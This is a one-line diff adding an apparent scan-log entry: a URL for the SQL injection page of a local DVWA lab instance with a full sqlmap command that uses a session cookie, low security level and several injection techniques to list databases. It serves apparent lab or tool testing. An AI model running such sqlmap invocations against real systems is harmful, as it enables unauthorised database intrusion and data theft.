@@ -1,0 +1,1 @@
+http://host.docker.internal:8080/vulnerabilities/sqli/?id=1&Submit=Submit (GET)  # /usr/bin/sqlmap -u http://host.docker.internal:8080/vulnerabilities/sqli/?id=1&Submit=Submit "--cookie=PHPSESSID=i2suapb148lfrv28u262n4teb0; security=low" --batch --flush-session --fresh-queries --technique=BEU --time-sec=2 --random-agent --dbs
